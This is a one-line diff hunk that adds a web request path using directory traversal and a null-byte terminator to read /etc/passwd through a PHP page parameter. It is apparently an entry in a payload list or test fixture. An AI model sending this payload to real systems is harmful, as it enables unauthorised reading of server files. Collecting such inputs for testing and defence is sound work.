@@ -1,0 +1,1 @@
+/index.php?page_slug=../../../../../etc/passwd%00
